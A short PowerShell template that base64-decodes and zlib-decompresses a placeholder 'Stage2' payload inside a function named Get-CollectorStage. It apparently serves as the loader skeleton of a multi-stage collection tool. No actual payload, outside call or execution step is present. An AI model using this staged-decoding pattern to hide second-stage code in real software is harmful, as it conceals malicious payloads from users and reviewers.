$CollectionId = 'FKCOL-2841'
$Stage2Encoding = 'base64+zlib'
$Stage2Sha256 = '__STAGE2_SHA256__'
$Stage2 = '__STAGE2_BASE64__'

function Get-CollectorStage {
    $compressed = [Convert]::FromBase64String($Stage2)
    $input = [IO.MemoryStream]::new($compressed)
    $zlib = [IO.Compression.ZLibStream]::new($input, [IO.Compression.CompressionMode]::Decompress)
    $output = [IO.MemoryStream]::new()
    $zlib.CopyTo($output)
    [Text.Encoding]::UTF8.GetString($output.ToArray())
}

